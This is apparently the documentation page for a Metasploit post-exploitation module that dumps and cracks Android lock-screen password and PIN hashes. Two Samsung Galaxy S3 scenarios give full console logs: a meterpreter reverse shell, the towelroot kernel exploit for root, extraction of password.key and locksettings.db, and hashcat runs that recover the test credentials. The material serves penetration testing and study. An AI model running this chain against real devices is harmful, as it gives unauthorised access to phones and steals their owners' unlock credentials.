{"componentChunkName":"component---src-templates-module-documentation-template-tsx","path":"/modules/documentation/post/android/gather/hashdump","result":{"data":{"moduleMetadataJson":{"id":"8a4d14aa-83cd-54b3-b13d-baf438e1fe07","name":"Android Gather Dump Password Hashes for Android Systems","fullname":"post/android/gather/hashdump","description":"Post Module to dump the password hashes for Android System. Root is required.\n           To perform this operation, two things are needed.  First, a password.key file\n           is required as this contains the hash but no salt.  Next, a sqlite3 database\n           is needed (with supporting files) to pull the salt from.  Combined, this\n           creates the hash we need.  Samsung based devices change the hash slightly.","rank":300,"fields":{"detailsSlug":"/modules/details/post/android/gather/hashdump","documentationSlug":"/modules/documentation/post/android/gather/hashdump"},"documentation":{"html":"<h2 id=\"description\" style=\"position:relative;\"><a href=\"#description\" aria-label=\"description permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Description</h2>\n<p>Post Module to dump the password hashes for Android System. Root is required.\nTo perform this operation, two things are needed.  First, a password.key file\nis required as this contains the hash but no salt.  Next, a sqlite3 database\nis needed (with supporting files) to pull the salt from.  Combined, this\ncreates the hash we need.  This can be cracked with Hashcat, mode 5800.\nSamsung devices only have SHA1 hashes, while most other Android devices\nalso have an MD5 hash.  </p>\n<p>A PIN is simply an all digit password.  </p>\n<p>A Pattern lock is also an all digit password where each dot is represented by a number.</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">1   2   3\n\n4   5   6\n\n7   8   9</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span><span></span></span></pre></div>\n<h2 id=\"verification-steps\" style=\"position:relative;\"><a href=\"#verification-steps\" aria-label=\"verification steps permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Verification Steps</h2>\n<ol>\n<li>Get root on an Android device</li>\n<li>Start msfconsole</li>\n<li>Do: <code class=\"language-text\">use post/android/gather/hashdump</code></li>\n<li>Do: <code class=\"language-text\">set session [session]</code></li>\n<li>Do: <code class=\"language-text\">run</code></li>\n<li>You should get a password hash to crack.</li>\n</ol>\n<h2 id=\"scenarios\" style=\"position:relative;\"><a href=\"#scenarios\" aria-label=\"scenarios permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Scenarios</h2>\n<h3 id=\"passworded---samsung-galaxy-s3-verizon-sch-i535-w-android-442-kernel-340\" style=\"position:relative;\"><a href=\"#passworded---samsung-galaxy-s3-verizon-sch-i535-w-android-442-kernel-340\" aria-label=\"passworded   samsung galaxy s3 verizon sch i535 w android 442 kernel 340 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Passworded - Samsung Galaxy S3 Verizon (SCH-I535 w/ android 4.4.2, kernel 3.4.0)</h3>\n<p>Using <code class=\"language-text\">towelroot</code> to get root.  Device is set to use Password as the screen lock.  Password is <code class=\"language-text\">test</code>.</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">resource (android.128.rb)&gt; use exploit/multi/handler\nresource (android.128.rb)&gt; set payload android/meterpreter_reverse_tcp\npayload =&gt; android/meterpreter_reverse_tcp\nresource (android.128.rb)&gt; set lport 9999\nlport =&gt; 9999\nresource (android.128.rb)&gt; setg lhost 111.111.1.111\nlhost =&gt; 111.111.1.111\nresource (android.128.rb)&gt; setg verbose true\nverbose =&gt; true\nresource (android.128.rb)&gt; run\n[*] Started reverse TCP handler on 111.111.1.111:9999 \n[*] Meterpreter session 1 opened (111.111.1.111:9999 -&gt; 222.222.2.222:42547) at 2019-10-27 20:48:49 -0400\nWARNING: Local file /root/metasploit-framework/data/meterpreter/ext_server_stdapi.jar is being used\nWARNING: Local files may be incompatible with the Metasploit Framework\n\nmeterpreter &gt; background\n[*] Backgrounding session 1...\nresource (android.128.rb)&gt; use towelroot\n\nMatching Modules\n================\n\n   #  Name                                 Disclosure Date  Rank       Check  Description\n   -  ----                                 ---------------  ----       -----  -----------\n   0  exploit/android/local/futex_requeue  2014-05-03       excellent  Yes    Android &#39;Towelroot&#39; Futex Requeue Kernel Exploit\n\n\n[*] Using exploit/android/local/futex_requeue\nresource (android.128.rb)&gt; set session 1\nsession =&gt; 1\nresource (android.128.rb)&gt; run\n\n[*] Started reverse TCP handler on 111.111.1.111:4444 \n[+] Android version 4.4.2 appears to be vulnerable\n[*] Found device: d2vzw\n[*] Fingerprint: Verizon/d2vzw/d2vzw:4.4.2/KOT49H/I535VRUDNE1:user/release-keys\n[*] Using target: New Samsung\n[*] Loading exploit library /data/data/com.metasploit.stage/files/vnytm\n[*] Loaded library /data/data/com.metasploit.stage/files/vnytm, deleting\n[*] Waiting 300 seconds for payload\n[*] Transmitting intermediate stager...(136 bytes)\n[*] Sending stage (904600 bytes) to 222.222.2.222\n[*] Meterpreter session 2 opened (111.111.1.111:4444 -&gt; 222.222.2.222:51741) at 2019-10-27 20:49:34 -0400\n\nmeterpreter &gt; background\n[*] Backgrounding session 2...\nresource (android.128.rb)&gt; use post/android/gather/hashdump\nresource (android.128.rb)&gt; set session 2\nsession =&gt; 2\nresource (android.128.rb)&gt; run\n\n[!] SESSION may not be compatible with this module.\n[*] Attempting to determine unsalted hash\n[+] Saved password.key\n[*] Attempting to determine salt\n[*] OS Version: 4.4.2\n[*] Attempting to load &gt;=4.3.0 Android settings file\n[+] Saved locksettings.db with length 4096\n[+] Saved locksettings.db-wal with length 140112\n[+] Saved locksettings.db-shm with length 32768\n[+] Password Salt: 4aafc54dc502e88b\n[+] SHA1: EA8457DE97836C955082AE77DBE2CD86A4E8BC0E:4aafc54dc502e88b\n[+] Crack with: hashcat -m 5800 EA8457DE97836C955082AE77DBE2CD86A4E8BC0E:4aafc54dc502e88b\n[*] Post module execution completed\nmsf5 post(android/gather/hashdump) &gt; creds\nCredentials\n===========\n\nhost  origin        service  public  private                                                    realm  private_type        JtR Format\n----  ------        -------  ------  -------                                                    -----  ------------        ----------\n      222.222.2.222                  EA8457DE97836C955082AE77DBE2CD86A4E8BC0E:4aafc54dc502e88b         Nonreplayable hash  android-sha1</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>\n<p>We can now crack the password with hashcat as per the last line.</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\"># hashcat -m 5800 EA8457DE97836C955082AE77DBE2CD86A4E8BC0E:4aafc54dc502e88b --show\nea8457de97836c955082ae77dbe2cd86a4e8bc0e:4aafc54dc502e88b:test</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span></span></pre></div>\n<h3 id=\"pin---samsung-galaxy-s3-verizon-sch-i535-w-android-442-kernel-340\" style=\"position:relative;\"><a href=\"#pin---samsung-galaxy-s3-verizon-sch-i535-w-android-442-kernel-340\" aria-label=\"pin   samsung galaxy s3 verizon sch i535 w android 442 kernel 340 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>PIN - Samsung Galaxy S3 Verizon (SCH-I535 w/ android 4.4.2, kernel 3.4.0)</h3>\n<p>Using <code class=\"language-text\">towelroot</code> to get root.  Device is set to use PIN as the screen lock.  Password is <code class=\"language-text\">1234</code>.</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">resource (android.128.rb)&gt; use exploit/multi/handler\nresource (android.128.rb)&gt; set payload android/meterpreter_reverse_tcp\npayload =&gt; android/meterpreter_reverse_tcp\nresource (android.128.rb)&gt; set lport 9999\nlport =&gt; 9999\nresource (android.128.rb)&gt; setg lhost 111.111.1.111\nlhost =&gt; 111.111.1.111\nresource (android.128.rb)&gt; setg verbose true\nverbose =&gt; true\nresource (android.128.rb)&gt; run\n[*] Started reverse TCP handler on 111.111.1.111:9999 \n[*] Meterpreter session 1 opened (111.111.1.111:9999 -&gt; 222.222.2.222:39987) at 2019-10-27 21:04:57 -0400\nWARNING: Local file /root/metasploit-framework/data/meterpreter/ext_server_stdapi.jar is being used\nWARNING: Local files may be incompatible with the Metasploit Framework\n\nmeterpreter &gt; background\n[*] Backgrounding session 1...\nresource (android.128.rb)&gt; use towelroot\n\nMatching Modules\n================\n\n   #  Name                                 Disclosure Date  Rank       Check  Description\n   -  ----                                 ---------------  ----       -----  -----------\n   0  exploit/android/local/futex_requeue  2014-05-03       excellent  Yes    Android &#39;Towelroot&#39; Futex Requeue Kernel Exploit\n\n\n[*] Using exploit/android/local/futex_requeue\nresource (android.128.rb)&gt; set session 1\nsession =&gt; 1\nresource (android.128.rb)&gt; run\n\n[*] Started reverse TCP handler on 111.111.1.111:4444 \n[+] Android version 4.4.2 appears to be vulnerable\n[*] Found device: d2vzw\n[*] Fingerprint: Verizon/d2vzw/d2vzw:4.4.2/KOT49H/I535VRUDNE1:user/release-keys\n[*] Using target: New Samsung\n[*] Loading exploit library /data/data/com.metasploit.stage/files/rlotf\n[*] Loaded library /data/data/com.metasploit.stage/files/rlotf, deleting\n[*] Waiting 300 seconds for payload\n[*] Transmitting intermediate stager...(136 bytes)\n[*] Sending stage (904600 bytes) to 222.222.2.222\n[*] Meterpreter session 2 opened (111.111.1.111:4444 -&gt; 222.222.2.222:57268) at 2019-10-27 21:05:25 -0400\n\nmeterpreter &gt; background\n[*] Backgrounding session 2...\nresource (android.128.rb)&gt; use post/android/gather/hashdump\nresource (android.128.rb)&gt; set session 2\nsession =&gt; 2\nresource (android.128.rb)&gt; run\n\n[!] SESSION may not be compatible with this module.\n[*] Attempting to determine unsalted hash\n[+] Saved password.key\n[*] Attempting to determine salt\n[*] OS Version: 4.4.2\n[*] Attempting to load &gt;=4.3.0 Android settings file\n[+] Saved locksettings.db with length 4096\n[+] Saved locksettings.db-wal with length 206032\n[+] Saved locksettings.db-shm with length 32768\n[+] Password Salt: 4aafc54dc502e88b\n[+] SHA1: 9E201EFFCC29C8F54E1ECEC307CB1DA18B6B6E6B:4aafc54dc502e88b\n[+] Crack with: hashcat -m 5800 9E201EFFCC29C8F54E1ECEC307CB1DA18B6B6E6B:4aafc54dc502e88b\n[*] Post module execution completed</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>\n<p>We can now crack the password with hashcat as per the last line.</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\"># hashcat -m 5800 9E201EFFCC29C8F54E1ECEC307CB1DA18B6B6E6B:4aafc54dc502e88b -a 3 ?d?d?d?d\nhashcat (v5.1.0) starting...\n\n...\n\nApproaching final keyspace - workload adjusted.  \n\n9e201effcc29c8f54e1ecec307cb1da18b6b6e6b:4aafc54dc502e88b:1234\n                                                 \nSession..........: hashcat\nStatus...........: Cracked\nHash.Type........: Samsung Android Password/PIN\nHash.Target......: 9e201effcc29c8f54e1ecec307cb1da18b6b6e6b:4aafc54dc502e88b\nTime.Started.....: Sun Oct 27 21:06:04 2019 (0 secs)\nTime.Estimated...: Sun Oct 27 21:06:04 2019 (0 secs)\nGuess.Mask.......: ?d?d?d?d [4]\nGuess.Queue......: 1/1 (100.00%)\nSpeed.#1.........:    41481 H/s (0.31ms) @ Accel:32 Loops:15 Thr:1024 Vec:1\nRecovered........: 1/1 (100.00%) Digests, 1/1 (100.00%) Salts\nProgress.........: 1000/10000 (10.00%)\nRejected.........: 0/1000 (0.00%)\nRestore.Point....: 0/1000 (0.00%)\nRestore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:1020-1023\nCandidates.#1....: 1234 -&gt; 1764\nHardware.Mon.#1..: Temp: 54c Util:100% Core: 705MHz Mem:1400MHz Bus:16\n\nStarted: Sun Oct 27 21:06:00 2019\nStopped: Sun Oct 27 21:06:05 2019</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>"}}},"pageContext":{"id":"8a4d14aa-83cd-54b3-b13d-baf438e1fe07"}}}